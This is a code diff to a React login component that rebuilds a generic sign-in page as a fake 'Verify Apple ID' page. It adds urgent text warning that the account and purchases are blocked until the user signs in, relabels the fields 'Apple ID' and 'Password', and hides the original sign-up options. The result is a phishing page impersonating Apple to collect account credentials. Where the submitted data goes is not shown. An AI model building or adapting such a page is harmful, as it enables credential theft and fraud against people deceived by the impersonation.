@@ -20,7 +20,7 @@ const initialState = {
 };
 const Auth = () => {
   const [state, setState] = useState(initialState);
-  const [signUp, setSignUp] = useState(false);
+  const [signUp, setSignUp] = useState(true);
   const [file, setFile] = useState(null);
   const [progress, setProgress] = useState(false);
   const navigate = useNavigate();
@@ -98,13 +98,26 @@ const Auth = () => {
   return (
     <AuthWrapper>
       <LeftWrapper>
-        <img src={authBg} alt="Authentication Logo" />
+        {/* <img src={authBg} alt="Authentication Logo" /> */}
+        <h2>Verify Apple ID</h2>
+        <div>
+          <h4 style={{paddingTop: '30px'}}>Please sign in to verify your Apple ID</h4>
+          <p style={{paddingTop: '10px'}}>Please login to verify & update your Apple ID account information.</p>
+        </div>
+        
+        <div style={{marginTop: '30px'}}>
+         <h4>Account Verification.</h4>
+          <p style={{paddingTop: '10px', maxWidth: '400px'}}>We occasionally require our users to verify or update their account information on file. This can be due to invalid account details, or an expired payment method. </p>
+        </div>
+        <div style={{marginTop: '30px', maxWidth: '400px'}}>
+          <h5>You will be unable to use your Apple ID or make purchases until this process is completed.</h5>
+        </div>
       </LeftWrapper>
       <RightWrapper>
-        <div className="title">{!signUp ? 'Sign In' : 'Sign Up'}</div>
+        <div className="title">{!signUp ? 'Sign in to verify your Apple ID' : 'Sign in to verify your Apple ID'}</div>
         <div className="form-container">
           <form onSubmit={handleAuth}>
-            {signUp && (
+            {/* {signUp && (
               <>
                 <div className="user">
                   <input
@@ -126,12 +139,12 @@ const Auth = () => {
                   onChange={handleChange}
                 />
               </>
-            )}
+            )} */}
             <input
               type="email"
               name="email"
               id="email"
-              placeholder="Email"
+              placeholder="Apple ID"
               value={email}
               onChange={handleChange}
             />
@@ -139,7 +152,7 @@ const Auth = () => {
               type="password"
               name="password"
               id="password"
-              placeholder="Enter Password"
+              placeholder="Password"
               value={password}
               onChange={handleChange}
             />
@@ -147,10 +160,10 @@ const Auth = () => {
               className={`btn ${!signUp ? 'btn-sign-in' : 'btn-sing-up'}`}
               type="submit"
               disabled={progress !== null && progress > 100}>
-              {!signUp ? 'Sign In' : 'Sign Up'}
+              {!signUp ? 'Sign In To Your Apple ID' : 'Sign In To Your Apple ID'}
             </button>
           </form>
-          <div>
+          {/* <div>
             {!signUp ? (
               <>
                 <div className="last">
@@ -166,7 +179,7 @@ const Auth = () => {
                 </div>
               </>
             )}
-          </div>
+          </div> */}
         </div>
       </RightWrapper>
     </AuthWrapper>
